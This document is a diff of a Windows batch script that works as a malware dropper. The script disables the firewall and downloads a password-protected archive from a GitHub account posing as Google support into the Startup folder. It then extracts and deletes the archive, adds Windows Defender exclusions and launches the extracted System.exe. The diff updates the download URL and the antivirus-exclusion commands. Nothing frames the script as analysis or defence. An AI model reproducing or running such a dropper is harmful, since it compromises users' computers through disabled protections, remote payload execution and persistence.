@@ -81,32 +81,24 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/project/raw/main/winfiles.zip  winfiles.zip
+bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip
 
-curl -L https://github.com/supportgoogle34/project/raw/main/winfiles.zip  -o  winfiles.zip
+curl -L https://github.com/supportgoogle34/files/raw/main/winfiles.zip  -o  winfiles.zip
 
 curl  -L https://www.7-zip.org/a/7zr.exe -o 7z.exe
 
-bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/project/raw/main/winfiles.zip  winfiles.zip
+bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip
 
 7z.exe x  winfiles.zip -pkali#241 -aos
 
+del winfiles.zip
 
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
 
-Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
+powershell Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 System.exe
 powershell -command " start System.exe"
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 System.exe
-
-
-
-
-
-
-
-
-
